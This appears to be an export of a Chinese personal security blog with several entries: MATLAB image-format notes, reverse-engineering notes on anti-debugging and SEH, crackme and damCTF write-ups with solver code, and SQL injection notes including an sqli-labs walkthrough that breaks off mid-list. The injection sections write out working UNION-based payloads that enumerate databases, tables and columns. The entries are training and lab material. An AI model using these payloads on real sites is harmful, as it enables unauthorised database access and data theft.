<p>索引图像由数据矩阵 X 和颜色图矩阵 map 组成。map 是一个 double 类的 m×3 数组，由 [0, 1] 范围内的浮点值组成。map 的每一行指定单一颜色的红、绿和蓝分量。索引图像使用像素值到颜色图值的“直接映射”。每个图像像素的颜色是以 X 中的对应值为索引求得的 map 中的值。<strong>因此 X 值必须是整数。值 1 指向 map 中第一行，值 2 指向第二行，以此类推。使用以下语句显示索引图像。</strong><br><code>image(X); colormap(map)</code><br>图像矩阵和颜色图中值的关系取决于图像矩阵的类。如果图像矩阵是 double 类，那么值 1 指向颜色图中的第一行，值 2 指向第二行，以此类推。如果图像矩阵是 uint8 或 uint16 类，那么有个偏移 - 值 0 指向颜色图中的第一行，值 1 指向第二行，以此类推。在图形文件格式中使用偏移是为了使可支持的颜色数目达到最大。在上面的图像中，图像矩阵是 double 类。</p>
<hr>
<p>强度图像是一个数据矩阵 I，其中的值表示某一范围内的强度。强度图像表示为单个矩阵，矩阵的每个元素对应一个图像像素。<br>imagesc(A); colormap(gray)<br>imagesc(A,[min(A(:)) max(A(:))]); colormap(gray)</p>
<hr>
<p>bit-depth：使用多少位来定义一个像素点。bit-depth越大，可以表示的色彩就越多。通常情况下，图像的像素值范围为0-255， 则其bit-depth就是8。RGB图像的bit-depth为24：8bit表示R，8bit表示G，8bit表示B。</p>
<p>RGB 图像，有时称为真彩色图像，以 m×n×3 数据数组形式存储，该数组定义了对应图像每个像素的红色、绿色和蓝色分量。<br><strong>例如像素 (10,5) 的红色、绿色和蓝色分量分别存储在 RGB(10,5,1)、RGB(10,5,2) 和 RGB(10,5,3) 中。</strong></p>
<hr>
<p>您可以对 uint8 和 uint16 数组执行其他几种操作，包括：<br>使用 reshape、cat、permute 函数以及 [] 和 ‘ 运算符重构、重新排序和串联数组<br>使用 save 和 load 将 uint8 和 uint16 数组保存及加载到 MAT 文件。（请记住，如果要加载或保存图形格式文件图像，则必须使用 imread 和imwrite 命令代替。）<br>使用 find 定位 uint8 和 uint16 数组中非零元素的索引。但返回的数组始终为 double 类。<br>关系运算符</p>
<p>基于 NTSC 标准合并 RGB 值，以此方式来计算单色亮度，这会将与眼睛敏感度相关的系数应用到 RGB 颜色：</p>
<pre><code>I = .2989*rgb_img(:,:,1)...
    +.5870*rgb_img(:,:,2)...
    +.1140*rgb_img(:,:,3);</code></pre>
]]></content>
      <tags>
        <tag>matlab</tag>
      </tags>
  </entry>
  <entry>
    <title>nice try</title>
    <url>/2020/10/27/nice_try/</url>
    <content><![CDATA[<h2 id="lt-逆向工程-核心原理-gt-终结"><a href="#lt-逆向工程-核心原理-gt-终结" class="headerlink" title="&lt;逆向工程-核心原理&gt;终结"></a>&lt;逆向工程-核心原理&gt;终结</h2><p><strong>看了两三年，终于看完了，</strong><code>nice try </code>2020-10-27 15:20:20 星期二  :tw-1f4aa:</p>
<p><em>接下来的是阅读过程中的一些笔记</em></p>
<a id="more"></a>
<hr>
<h3 id="内核调试"><a href="#内核调试" class="headerlink" title="内核调试"></a>内核调试</h3><p>终端中输入 <code>bcdedit -debug on</code><br>开启内核调试模式</p>
<h3 id="WINDBG"><a href="#WINDBG" class="headerlink" title="WINDBG"></a>WINDBG</h3><pre><code>lkd&gt; u nt!ZwCreateFile L50</code></pre>
<p>查看createfile 代码<br>u 反汇编 u L10显示10行命令</p>
<p>db命令<br>d-display</p>
<hr>
<h3 id="删除ASLR功能"><a href="#删除ASLR功能" class="headerlink" title="删除ASLR功能"></a>删除ASLR功能</h3><p>将选择头中的DLL Characteristics中DYNAMIC_BASE标志删除即可</p>
<hr>
<h3 id="TLS回调函数"><a href="#TLS回调函数" class="headerlink" title="TLS回调函数"></a>TLS回调函数</h3><p>长用于反调试<br>类似于linux <code>ptrace() </code>函数</p>
<p>每当创建/终止进程的线程时会自动调用执行的函数。创建进程的主线程会先于EP代码，调用回调函数</p>
<p>在选择头中有TLS表地址，里面是tls结构体的地址，可能有多个结构体，<code>address of callbacks</code>成员指向tls函数地址</p>
<hr>
<h3 id="isDebuggerPersent"><a href="#isDebuggerPersent" class="headerlink" title="isDebuggerPersent()"></a>isDebuggerPersent()</h3><p>检查<code>peb.deingdebugged</code>值，<code>+02</code>处<br>判断是否处于调试</p>
<p><code>getmodulehandle()</code><br>获取进程imagebase</p>
<hr>
<h3 id="windbg-配置符号表"><a href="#windbg-配置符号表" class="headerlink" title="windbg 配置符号表"></a>windbg 配置符号表</h3><p>srv*<a href="https://msdl.microsoft.com/download/symbols">https://msdl.microsoft.com/download/symbols</a><br>通知 WinDbg 进行符号文件的初始查找和加载：<br>.reload<br>Lm 查看已加载模块</p>
<p><code>dt </code><br>displays information about a local variable, global variable or data type</p>
<p>dt _teb<br>dt _peb<br>dt _peb_ldr_data</p>
<hr>
<h3 id="PEB"><a href="#PEB" class="headerlink" title="PEB"></a>PEB</h3><p>模块=dll加载后，通过PEB.ldr 直接获取该模块的加载基地址</p>
<p><code>FS:[0]</code> TEB起始地址</p>
<p><code>FS:[30]</code> PEB起始地址</p>
<hr>
<h3 id="利用SEH机制的反调试技术"><a href="#利用SEH机制的反调试技术" class="headerlink" title="利用SEH机制的反调试技术"></a>利用SEH机制的反调试技术</h3><p>程序在正常运行和调试运行时表现出的行为动作是不同的<br>正常：程序自己处理<br>调试时：抛给调试器处理</p>
<p>通过<code>TEB.NtTib.ExceptionList </code>找到SEH链</p>
<pre><code>TEB.NtTib.ExceptionList =FS：[0]</code></pre>
<hr>
<p>结构体 构成链</p>
<pre><code>* next_seh
* handler</code></pre>
<p>esp+c 即指向 pContext<br>seh函数参数第三个为<code>指向pContext的指针</code>，保存<code>线程寄存器值</code>，执行其他进程就会保存寄存器值。<br><code>*pContext+B8 </code>(32位下）为EIP值， <code>修改EIP</code>，改变执行流程<br>一样，通过<code>PEB.isdebuggerpersent()</code>API 取得beingDebugged值判断</p>
<hr>
<h3 id="保护器，压缩器"><a href="#保护器，压缩器" class="headerlink" title="保护器，压缩器"></a>保护器，压缩器</h3><p> 反调试–一个更简单，更好的方法：判断当前系统是否是为逆向分析专用系统</p>
<pre><code>findWindow() , createTOOLhelp32SnapsHOT()
, GETcomputerName()</code></pre>
<h3 id="OllyDBG-view-seh-chain"><a href="#OllyDBG-view-seh-chain" class="headerlink" title="OllyDBG view-seh chain"></a>OllyDBG view-seh chain</h3><p><code>PEB.ImageBase</code> 保存进程的实际映射地址</p>
<h3 id="debug-blocker"><a href="#debug-blocker" class="headerlink" title="debug blocker"></a>debug blocker</h3><ol>
<li><p>被调试进程不能被其他进程调试</p>
</li>
<li><p>调试器操作被调试者的代码</p>
</li>
<li><p>调试器处理被调试进程中发生的异常</p>
</li>
</ol>
<h3 id="clbp"><a href="#clbp" class="headerlink" title="clbp"></a>clbp</h3><p>ollydgb的<code>条件记录断点</code><br>ctrl+G 将光标移到4011f0地址后，按shift+f4，打开设置CLBP对话框（条件断点）</p>
<p>detach 分离</p>
<pre><code>EB FE 无限循环</code></pre>
<p><code>DebugActiveProcessStop()</code><br>将被调试者从调试器中分离出来</p>
]]></content>
      <tags>
        <tag>RCE</tag>
      </tags>
  </entry>
  <entry>
    <title>root_me_PE_x86_SEHVEH_WP</title>
    <url>/2020/10/13/root_me_PE_x86_SEHVEH_WP/</url>
    <content><![CDATA[<h3 id="PE-DotNet-0-protection"><a href="#PE-DotNet-0-protection" class="headerlink" title="PE DotNet - 0 protection"></a>PE DotNet - 0 protection</h3><p>使用 <code>NET relector</code>工具<br>或者<code>dnSPY</code><br><a href="https://github.com/0xd4d/dnSpy/releases">https://github.com/0xd4d/dnSpy/releases</a><br>就可以破解</p>
<a id="more"></a>
<hr>
<h3 id="ELF-x64-Crackme-automating"><a href="#ELF-x64-Crackme-automating" class="headerlink" title="ELF x64 - Crackme automating"></a>ELF x64 - Crackme automating</h3><p>python 编程</p>
<p><code>别人写的代码</code><br><a href="https://mydiary42.wordpress.com/2019/01/26/root-me-crackme-automating/">https://mydiary42.wordpress.com/2019/01/26/root-me-crackme-automating/</a></p>
<p>int([x]) -&gt; integer<br>int(x, base=10) -&gt; integer<br>将数字或字符转为整形<br>Convert a number or string to an integer, or return 0 if no arguments are given. </p>
<pre><code>num=line[addr+1,-1]

byte.append(int (num,16)) //将num变为16进制</code></pre>
<p>使用<code>pwntools</code> / <code>Capstone</code> /<code>objdump</code> 获得反汇编代码<br>之后进行搜索</p>
<hr>
<h3 id="PE-x86-SEHVEH-WP"><a href="#PE-x86-SEHVEH-WP" class="headerlink" title="PE x86 - SEHVEH_WP"></a>PE x86 - SEHVEH_WP</h3><p>从题目知道是关于SEH 和 VEH（VectoredExceptionHandler）的。</p>
<p><em>OllyDBG 查看seh链 选择 <code>view-seh chain</code></em></p>
<hr>
<ol>
<li><p>在输入后进入主要部分。</p>
<img src="https://s1.ax1x.com/2020/10/13/0hMvnK.jpg" alt="0hMvnK.jpg" border="0" />
这段不是很懂，根据多次调试后判断，如果输入12个字节，则`0xB814A8`处就可以跳转，使`EBP`为0.
<img src="https://s1.ax1x.com/2020/10/13/0hQv2n.jpg" alt="0hQv2n.jpg" border="0" />
为0，即表示密码正确，会输入成功语句。
</li>
<li><p>接下来是第一部分密码</p>
<img src="https://s1.ax1x.com/2020/10/13/0hllIe.jpg" alt="0hllIe.jpg" border="0" />
`LODS `即将密码头四个字节放入`EAX`中，将`0x5A643059 xor 0x 3628552E `得到第一部分密码，还需反序排列为`weLl`
</li>
<li><p>FS：[0] 为TEB结构体中指向第一个SEH结构体地址</p>
<img src="https://s1.ax1x.com/2020/10/13/0h1iOP.jpg" alt="0h1iOP.jpg" border="0" />
<img src="https://s1.ax1x.com/2020/10/13/0h1fXt.jpg" alt="0h1fXt.jpg" border="0" />
即`0xEFFC14`.
接着，执行`INT 1`指令后，会进入`0xDB1D60`处的第一个SEH函数。
<img src="https://s1.ax1x.com/2020/10/13/0hdwPP.jpg" alt="0hdwPP.jpg" border="0" />
SEH函数的第三个参数，即`[ESP+C]`为pContext的地址，pContext保存线程切换时的寄存器信息。在PE 32位下，`+0xB0`为EAX寄存器的值，`0xB81D64`处将`0x48335621`加到`EAX+0xB0`中，保存着输入的第二部分四字节密码。
`+0xB8`为EIP寄存器的值，通过下面的判断将EIP值加2，结果为`0xB814E4`，即`INT 1`指令的下一条指令地址。
`XOR EAX,EAX`将EAX置0，表示从发生异常的代码处继续执行。
<img src="https://s1.ax1x.com/2020/10/13/0hwUL4.jpg" alt="0hwUL4.jpg" border="0" />
最后计算如下：
`FF2C F8E5 XOR 495F 4265 = B673 BA80 - 48335621 = 6E40 645F=n@d_`
反序排列为`_d@n`
</li>
<li><p><code>0xB814FF</code>处调用<code>AddVectoredExceptionHandler</code>函数，新增一个SEH函数。</p>
<img src="https://s1.ax1x.com/2020/10/13/0h09pV.jpg" alt="0h09pV.jpg" border="0" />
以下摘自https://docs.microsoft.com/en-us/windows/win32/api/errhandlingapi/nf-errhandlingapi-addvectoredexceptionhandler
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">PVOID <span class="title">AddVectoredExceptionHandler</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  ULONG                       First,</span></span></span><br><span class="line"><span class="function"><span class="params">  PVECTORED_EXCEPTION_HANDLER Handler</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>
`First`
The order in which the handler should be called. If the parameter is nonzero, the handler is the first handler to be called. If the parameter is zero, the handler is the last handler to be called.
如果不为0，则成为第一个调用的SEH函数，从图中可以看到，`First=1`.
`Handler`
A pointer to the handler to be called. For more information, see VectoredHandler.
从图中看出，函数地址为`0xB81940`，
`Return value`
If the function succeeds, the return value is a handle to the exception handler.
If the function fails, the return value is NULL.
<img src="https://s1.ax1x.com/2020/10/13/0h0zHH.jpg" alt="0h0zHH.jpg" border="0" />
该函数将第三部分的四字节密码减去了一个数，之后，又执行第二个SEH函数。`有个疑问是这里将返回值置0，又怎么执行第二个SEH函数。`
最后计算如下：
`3C4C7440 xor 74406653 =480C 1213 + 21486553 - 48335621=21212145=!!!E`
反序排列为`E!!!`
</li>
<li><p>最后三部分密码组合在一起：<code>weLl_d@nE!!!</code></p>
<img src="https://s1.ax1x.com/2020/10/13/0hDnsO.jpg" alt="0hDnsO.jpg" border="0" />
密码正确




</li>
</ol>
]]></content>
      <tags>
        <tag>RCE</tag>
      </tags>
  </entry>
  <entry>
    <title>damCTF- rev/schlage (beginner) __WP</title>
    <url>/2020/10/12/schlage%20(beginner)%20__WP/</url>
    <content><![CDATA[<h2 id="damCTF-rev-schlage-beginner-WP"><a href="#damCTF-rev-schlage-beginner-WP" class="headerlink" title="damCTF- rev/schlage (beginner) __WP"></a>damCTF- rev/schlage (beginner) __WP</h2><ol>
<li><p>先用<code>file</code>命令查看</p>
<img src="https://s1.ax1x.com/2020/10/12/0Rkyfe.jpg" alt="0Rkyfe.jpg" border="0" />
可以看到是64位的ELF文件,debug信息还在
</li>
<li><p>接着使用radare2反汇编</p>
<img src="https://s1.ax1x.com/2020/10/12/0RE8xJ.jpg" alt="0RE8xJ.jpg" border="0" />

</li>
</ol>
<p>使用<code>VV</code>命令进入视图模式</p>
<a id="more"></a>
<hr>
<p>我们的任务是解锁，这里又5把锁<br><img src="https://s1.ax1x.com/2020/10/12/0RVJfS.jpg" alt="0RVJfS.jpg" border="0" /></p>
<hr>
<p>关键的代码是这5个函数<br><img src="https://s1.ax1x.com/2020/10/12/0RVIk6.jpg" alt="0RVIk6.jpg" border="0" /></p>
<hr>
<h3 id="Pin1"><a href="#Pin1" class="headerlink" title="Pin1"></a>Pin1</h3><p>第三把锁比较简单，来看第一把锁<br><img src="https://s1.ax1x.com/2020/10/12/0RZxKJ.jpg" alt="0RZxKJ.jpg" border="0" /></p>
<p>也可以在视图模式按<code>o</code>再输入函数旁边的字母<br><img src="https://s1.ax1x.com/2020/10/12/0Rnph6.jpg" alt="0Rnph6.jpg" border="0" /></p>
<p>这是一个循环操作，共五次，每一次将两个数字异或，最后和<code>0xee</code>比较，相同则成功<br><code>rbp+rax-0x0e</code>即指向开头移入地址的5个数</p>
<p><code>0x3e xor 0x57 xor 0x81 xor 0xd3 xor 0x 25 xor 0x 93 xor 0xee</code> 结果为0<code>x99</code></p>
<h4 id="jle："><a href="#jle：" class="headerlink" title="jle："></a>jle：</h4><p>JNB al, bl  ；al里的内容不等于bl时跳转<br>JBE al, bl ；al里的内容小于或等于bl时跳转</p>
<p>；同理，JGB是大于或等于，<code>JLE是小于或等于</code><br>；A（above）大于，B（below）小于，E（equal）等于，用于比较无符号数<br>；G（great）大于，L（less than）小于， E（equal）等于，用于比较带符号数</p>
<hr>
<h3 id="pin5"><a href="#pin5" class="headerlink" title="pin5"></a>pin5</h3><img src="https://s1.ax1x.com/2020/10/12/0RuadA.jpg" alt="0RuadA.jpg" border="0" />
#### srand()
第5把锁用到了`srand()`和`rand()`两个函数。

<p>根据种子产生随机数</p>
<ol>
<li>给srand()提供一个种子，它是一个unsigned int类型；</li>
<li>调用rand()，它会根据提供给srand()的种子值返回一个随机数(在0到RAND_MAX之间)；</li>
</ol>
<p>也就是，一个种子，它所产生的随机数是固定的。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> a=<span class="number">1111638594</span>； <span class="comment">//0x42424242</span></span><br><span class="line">srand(a); </span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;rand()&lt;&lt;<span class="built_in">endl</span>;</span><br></pre></td></tr></table></figure>
<p>输入<code>rand()</code>生成的随机数即可，即为<code>1413036362</code></p>
<h4 id="lea"><a href="#lea" class="headerlink" title="lea"></a>lea</h4><p>lea是“load effective address”的缩写，简单的说，lea指令可以用来将一个内存地址<code>直接</code>赋给目的操作数，例如：lea eax,[ebx+8]就是将ebx+8这个值直接赋给eax，而不是把ebx+8处的<code>内存地址里</code>的<code>数据</code>赋给eax。而mov指令则恰恰相反，例如：mov eax,[ebx+8]则是把内存地址为ebx+8处的数据赋给eax。</p>
<hr>
<h3 id="pin2"><a href="#pin2" class="headerlink" title="pin2"></a>pin2</h3><img src="https://s1.ax1x.com/2020/10/12/0RKg1K.jpg" alt="0RKg1K.jpg" border="0" />
查看汇编代码可以知道，pin2根据实际输出了一个种子，根据种子调用`rand() `即可。

<p>这个种子下一把锁还要用到，再一次调用<code>rand()</code>，获得的是第二个随机数。</p>
<hr>
<h3 id="pin4"><a href="#pin4" class="headerlink" title="pin4"></a>pin4</h3><p>我认为这是最难得了，主要是编程。<br>直接看r2 太复杂，所以我用IDA PRO，然后F5反编译。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;What&#x27;s your favorite sentence?&quot;</span>);</span><br><span class="line">   fgets(s, <span class="number">32</span>, <span class="built_in">stdin</span>);</span><br><span class="line">   s[<span class="built_in">strcspn</span>(s, <span class="string">&quot;\n&quot;</span>)] = <span class="number">0</span>;         <span class="comment">//换行符变为0x00</span></span><br><span class="line">   v3 = rand() % <span class="number">10</span> + <span class="number">65</span>;</span><br><span class="line">   v1 = <span class="number">0</span>;</span><br><span class="line">   v4 = <span class="built_in">strlen</span>(s);                             <span class="comment">// strlen 遇到/0结束</span></span><br><span class="line">   <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v4; ++i )</span><br><span class="line">     v1 += v3 ^ s[i];        <span class="comment">//将随机值与字符异或，结果相加要为291</span></span><br><span class="line">   <span class="keyword">if</span> ( v1 == <span class="number">291</span> )</span><br><span class="line">   &#123;</span><br><span class="line">     <span class="built_in">puts</span>(<span class="string">&quot;Such a cool sentence!&quot;</span>);</span><br><span class="line">     byte_20203C = <span class="number">1</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">else</span></span><br><span class="line">   &#123;</span><br><span class="line">     <span class="built_in">puts</span>(<span class="string">&quot;Not a big fan of that sentence&quot;</span>);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
<p>注释已经写在代码中，接下来，就是编程破解得到符合的字符串。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">        <span class="comment">/*FILE *pe=NULL;</span></span><br><span class="line"><span class="comment">        char s[1]=&#123;&#x27;1&#x27;&#125;;</span></span><br><span class="line"><span class="comment">        pe=popen(&quot;nc chals.damctf.xyz 31932&quot;,&quot;rw&quot;);</span></span><br><span class="line"><span class="comment">        if(pe==NULL)</span></span><br><span class="line"><span class="comment">                cout&lt;&lt;&quot;connect failed&quot;&lt;&lt;endl;</span></span><br><span class="line"><span class="comment">        while (1)</span></span><br><span class="line"><span class="comment">        &#123;</span></span><br><span class="line"><span class="comment">                fwrite(s,sizeof(s),1,pe);</span></span><br><span class="line"><span class="comment">                fgets(s,20,pe);</span></span><br><span class="line"><span class="comment">                cout&lt;&lt;s;</span></span><br><span class="line"><span class="comment">                break;</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">        pclose(pe);*/</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">int</span> a=<span class="number">1602480388</span>;<span class="comment">//1111638594</span></span><br><span class="line">        srand(a); </span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;rand()&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> v3 = rand() % <span class="number">10</span> + <span class="number">65</span>;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;v3=&quot;</span>&lt;&lt;v3&lt;&lt;<span class="built_in">endl</span>; <span class="comment">//=74</span></span><br><span class="line">        <span class="keyword">int</span> remain=<span class="number">291</span>; <span class="comment">//291下搜索</span></span><br><span class="line">        <span class="keyword">int</span> qu=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> resu;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">32</span>;i++)&#123;  <span class="comment">//最大允许输入31个字符</span></span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;<span class="number">58</span>;j++)&#123; <span class="comment">//从A开始搜索</span></span><br><span class="line">                        resu=v3^<span class="keyword">int</span>(<span class="string">&#x27;A&#x27;</span>+j);</span><br><span class="line">                        <span class="keyword">if</span>(resu==<span class="number">0</span>) <span class="comment">//==0没有用</span></span><br><span class="line">                                &#123;<span class="keyword">continue</span>;&#125;</span><br><span class="line">                        <span class="keyword">else</span> <span class="keyword">if</span> ( resu&lt;remain || remain%resu==<span class="number">0</span>)&#123; <span class="comment">//实际上感觉不用加后面的条件</span></span><br><span class="line">                                qu+=remain/resu; <span class="comment">//累计得到的字符数</span></span><br><span class="line">                                <span class="keyword">if</span>(qu&gt;<span class="number">31</span>)&#123; <span class="comment">//不能大于31</span></span><br><span class="line">                                        qu-=remain/resu;</span><br><span class="line">                                        <span class="keyword">continue</span>;</span><br><span class="line">                                &#125;</span><br><span class="line">                                <span class="keyword">for</span>(<span class="keyword">int</span> k=<span class="number">0</span>;k&lt;remain/resu;k++) <span class="comment">//输出成功的字符</span></span><br><span class="line">                                        <span class="built_in">cout</span>&lt;&lt;<span class="keyword">char</span>(<span class="string">&#x27;A&#x27;</span>+j);</span><br><span class="line">                                <span class="built_in">cout</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">                                remain=remain%resu; <span class="comment">//更新余下值</span></span><br><span class="line">                                <span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;i=  &quot;</span>&lt;&lt;i&lt;&lt;<span class="string">&quot;   &quot;</span>&lt;&lt;<span class="string">&quot;resu=&quot;</span>&lt;&lt;resu&lt;&lt;<span class="string">&quot;qu= &quot;</span>&lt;&lt;qu&lt;&lt;<span class="string">&quot;remain=&quot;</span>&lt;&lt;remain&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">                                i=qu<span class="number">-1</span>; <span class="comment">//更新i</span></span><br><span class="line">                                <span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;after i= &quot;</span>&lt;&lt;i&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (remain==<span class="number">0</span>) <span class="comment">//填满291 成功</span></span><br><span class="line">                &#123;</span><br><span class="line">                        <span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;find&quot;</span>&lt;&lt;<span class="string">&quot;i=&quot;</span>&lt;&lt;i&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span>(i&gt;=<span class="number">31</span>) <span class="comment">//最后都没有搜索到，失败</span></span><br><span class="line">                &#123;</span><br><span class="line">                        <span class="built_in">cout</span>&lt;&lt;<span class="built_in">endl</span>&lt;&lt;<span class="string">&quot;don&#x27;t find&quot;</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">                        <span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;remainder= &quot;</span>&lt;&lt;remain&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>输入字符，成功解锁。</p>
<img src="https://s1.ax1x.com/2020/10/12/0Rlsts.jpg" alt="0Rlsts.jpg" border="0" />

<p>最后flag文件在远程服务器，但链接时间很短，可能需要脚本自动化发送，有点小难😢</p>
<hr>
<h4 id="fgets"><a href="#fgets" class="headerlink" title="fgets()"></a>fgets()</h4><p>C 库函数 char *fgets(char *str, int n, FILE *stream) 从指定的流 stream 读取一行，并把它存储在 str 所指向的字符串内。当读取 (n-1) 个字符时，或者读取到换行符时，或者到达文件末尾时，它会停止，具体视情况而定。</p>
<h4 id="strlen"><a href="#strlen" class="headerlink" title="strlen()"></a>strlen()</h4><p>C 库函数 size_t strlen(const char *str) 计算字符串 str 的长度，直到空结束字符，但不包括空结束字符。</p>
<h3 id="结束语"><a href="#结束语" class="headerlink" title="结束语"></a>结束语</h3><p>不愧是新手题，只是最后编程花了我不少时间。</p>
]]></content>
      <tags>
        <tag>RCE</tag>
      </tags>
  </entry>
  <entry>
    <title>burpsuite 安全学院笔记</title>
    <url>/2019/05/17/sql-more-details/</url>
    <content><![CDATA[<p>For a UNION query to work, two key requirements must be met:</p>
<ol>
<li><strong>The individual queries must return the same number of columns.</strong></li>
<li>The data types in each column must be compatible between the individual queries.</li>
</ol>
<p>‘ ORDER BY 1–<br>‘ ORDER BY 2–<br>‘ ORDER BY 3–</p>
<p>‘ UNION SELECT NULL–<br>‘ UNION SELECT NULL,NULL–<br>‘ UNION SELECT NULL,NULL,NULL–</p>
<a id="more"></a>
<p>The reason for using NULL as the values returned from the injected SELECT query is that the data types in each column must be compatible between the original and the injected queries. Since NULL is convertible to every commonly used data type, using NULL maximizes the chance that the payload will succeed when the column count is correct.<br>On Oracle, every SELECT query must use the FROM keyword and specify a valid table. There is a built-in table on Oracle called DUAL which can be used for this purpose. So the injected queries on Oracle would need to look like: ‘ UNION SELECT NULL FROM DUAL–.<br>The payloads described use the double-dash comment sequence – to comment out the remainder of the original query following the injection point. On MySQL, the double-dash sequence must be followed by a space. Alternatively, the hash character # can be used to identify a comment.</p>
<p>Database type     Query<br>Microsoft, MySQL     SELECT @@version<br>Oracle     SELECT * FROM v$version<br>PostgreSQL     SELECT version() </p>
<p>For more advanced users, the solution described here could be made more elegant in various ways. For example, instead of iterating over every character, you could perform a binary search of the character space. Or you could create a single Intruder attack with two payload positions and the “Cluster bomb” attack type, and work through all permutations of offsets and character values. </p>
<p>Review the attack results to find the value of the character at the first position. The application returns an HTTP 500 status code when the error occurs, and an HTTP 200 status code normally. The “Status” column in the Intruder results shows the HTTP status code, so you can easily find the row with 500 in this column. The payload showing for that row is the value of the character at the first position. </p>
]]></content>
      <tags>
        <tag>sql</tag>
      </tags>
  </entry>
  <entry>
    <title>sqli-labs(less-1__less-22)</title>
    <url>/2019/02/26/sqli-labs/</url>
    <content><![CDATA[<hr>
<p><strong>闭合有<code>&#39;</code> <code>&quot;</code> <code>)</code> 单双引号不能同时存在，<code>)</code> 可有多个</strong></p>
<h2 id="Less-1"><a href="#Less-1" class="headerlink" title="Less-1"></a>Less-1</h2><blockquote>
<p>single 单个的<br>quote 引号<br>变量前面加 <strong>?</strong><br>information_schema.tables<br>information_schema.columns<br>information_schema.schemata</p>
</blockquote>
<p>在Less-1里的index.php中添加 <code>echo $sql;</code> 可在网页中显示查询代码，<code>echo &quot;&lt;br&gt;&quot;;</code> 表示换行</p>
<a id="more"></a>

<hr>
<ol>
<li><ul>
<li><code>?id=1&#39;  and 1=1 --+</code> 没有报错，返回正确结果</li>
<li><code>?id=10&#39;</code> 报错 <code>You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near &#39;&#39;10&#39;&#39; LIMIT 0,1&#39; at line 1</code></li>
<li><code>?id=1&#39; and 1=2 --+ </code> 没有正确结果<br>经过这三个步骤说明是字符型注入</li>
</ul>
</li>
<li><p>使用order by来判断有几个字段<br><code>?id=1&#39; order by 4--+</code><br>报错<code>Unknown column &#39;4&#39; in &#39;order clause&#39;</code><br>说明有3个字段</p>
</li>
<li><p><code>LIMIT 0,1</code> 表示结果只显示一行<br><code>?id=-1&#39; union select 1,2,3 --+</code> 看哪个字段可以回显<br><a href="https://imgchr.com/i/k7xiTg"><img src="https://s2.ax1x.com/2019/02/28/k7xiTg.png" alt="k7xiTg.png"></a></p>
</li>
<li><p><code>?id=1&#39; union select 1,concat_ws(&#39;_&#39;,version(),user(),database()),@@basedir --+</code><br>得到版本，用户，当前数据库，数据路径<br><a href="https://imgchr.com/i/k7zDbT"><img src="https://s2.ax1x.com/2019/02/28/k7zDbT.png" alt="k7zDbT.png"></a></p>
</li>
</ol>
<p><em>concat_ws 带分隔符的链接</em></p>
<ol>
<li><code>?id=-1&#39; union select 1, group_concat(table_name),3 from information_schema.tables where table_schema = database() --+</code><br>得到当前库的表名<br><a href="https://imgchr.com/i/kHSWFg"><img src="https://s2.ax1x.com/2019/02/28/kHSWFg.png" alt="kHSWFg.png"></a><br><code>?id=-1&#39; union select 1,(select group_concat(schema_name) from information_schema.schemata) ,3 --+ </code><br>查看数据库名信息</li>
</ol>
<p><em>group_concat 行转列</em></p>
<ol>
<li><p><code>?id=-1 &#39; union select 1, (select group_concat(column_name)  from information_schema.columns where table_name=&quot;users&quot;), 3 --+</code><br>users 表的列名<br><a href="https://imgchr.com/i/kHp8hQ"><img src="https://s2.ax1x.com/2019/02/28/kHp8hQ.png" alt="kHp8hQ.png"></a></p>
</li>
